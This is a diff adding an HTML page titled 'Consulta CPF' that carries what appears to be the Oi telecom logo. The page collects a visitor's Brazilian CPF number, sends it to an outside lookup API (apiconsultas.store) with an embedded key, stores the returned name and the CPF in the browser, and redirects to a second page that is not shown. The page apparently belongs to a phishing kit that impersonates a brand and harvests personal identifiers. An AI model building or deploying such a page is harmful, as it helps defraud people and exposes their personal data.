@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Consulta CPF</title>
+  
+  <!-- Link para a fonte Roboto -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    /* Estilo do botão */
+    .custom-button {
+      background-color: #c0c0c0; /* Cinza inicialmente */
+      color: #ffffff; /* Cor do texto */
+      font-size: 16px;
+      font-family: 'Roboto', sans-serif; /* Fonte atualizada */
+      padding: 12px 70px;
+      border: none;
+      border-radius: 44px;
+      cursor: not-allowed;
+      text-align: center;
+      display: inline-block;
+      width: 100%;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      margin-top: 10px;
+    }
+
+    /* Centralização da logo */
+    .logo-container {
+      text-align: center; /* Centraliza o conteúdo */
+      margin: 40px 0; /* Espaço acima e abaixo da logo */
+    }
+
+    /* Espaciamento do formulário */
+    .form-container {
+      text-align: center; /* Centraliza o conteúdo do formulário */
+      margin-bottom: 20px; /* Espaço abaixo do formulário */
+    }
+
+    /* Estilo do campo de entrada */
+    #cpfInput {
+      padding: 10px; /* Espaçamento interno */
+      border: 2px solid #c0c0c0; /* Borda cinza */
+      border-radius: 4px; /* Bordas arredondadas */
+      font-size: 16px; /* Tamanho da fonte */
+      font-family: 'Roboto', sans-serif; /* Fonte atualizada */
+      width: 80%; /* Largura do campo */
+      max-width: 300px; /* Largura máxima */
+      margin-top: 10px; /* Espaço acima do campo */
+      transition: border-color 0.3s; /* Transição suave */
+    }
+
+    /* Efeito ao focar no campo */
+    #cpfInput:focus {
+      border-color: rgb(28, 97, 20); /* Borda verde ao focar */
+      outline: none; /* Remove o contorno padrão */
+    }
+
+    /* Cor verde quando ativo */
+    .active {
+      background-color: rgb(28, 97, 20); /* Verde */
+      cursor: pointer;
+    }
+
+    /* Fonte do corpo */
+    body {
+      font-family: 'Roboto', sans-serif; /* Fonte do corpo atualizada */
+      margin: 0;
+      padding: 20px; /* Espaço ao redor do corpo */
+      background-color: #f9f9f9; /* Fundo claro */
+    }
+  </style>
+
+</head>
+<body>
+
+  <div class="logo-container">
+    <img src="logodaoi.png" alt="logo">
+  </div>
+
+  <!-- Formulário de CPF -->
+  <div class="form-container">
+    <label for="cpfInput">Digite seu CPF:</label>
+    <input id="cpfInput" type="text" maxlength="11" placeholder="Digite seu CPF">
+  </div>
+
+  <!-- Botão de Consultar -->
+  <div class="button-container">
+    <button id="submitBtn" class="custom-button" disabled>Consultar</button>
+  </div>
+
+  <script>
+    // Habilita o botão ao digitar CPF válido
+    document.getElementById('cpfInput').addEventListener('input', function () {
+      var cpfValue = this.value;
+      var submitBtn = document.getElementById('submitBtn');
+
+      // Verifica se há exatamente 11 dígitos e se são números
+      if (cpfValue.length === 11 && !isNaN(cpfValue)) {
+        submitBtn.classList.add('active');
+        submitBtn.removeAttribute('disabled'); // Torna o botão clicável
+      } else {
+        submitBtn.classList.remove('active');
+        submitBtn.setAttribute('disabled', true); // Torna o botão não clicável
+      }
+    });
+
+    // Função ao clicar no botão
+    document.getElementById('submitBtn').addEventListener('click', function () {
+      var cpfValue = document.getElementById('cpfInput').value;
+
+      // URL da API com o CPF digitado
+      var apiUrl = `https://apiconsultas.store/api/?usuario=03f1ad6ffc4bb309b1660e6a2f8fd5a2&api=cpf&cpf=${cpfValue}`;
+
+      // Faz a requisição GET à API
+      fetch(apiUrl)
+        .then(response => response.json())
+        .then(data => {
+          if (data && data.nome) {
+            // Armazena o nome e o CPF no localStorage
+           localStorage.setItem('userNome', data.nome);
+            localStorage.setItem('userCPF', cpfValue);
+
+            // Redireciona para page2.html
+            window.location.href = 'page2.html';
+          } else {
+            console.error('Erro: Dados da API inválidos');
+          }
+        })
+        .catch(error => {
+          console.error('Erro ao consultar a API:', error);
+        });
+    });
+  </script>
+
+</body>
+</html>
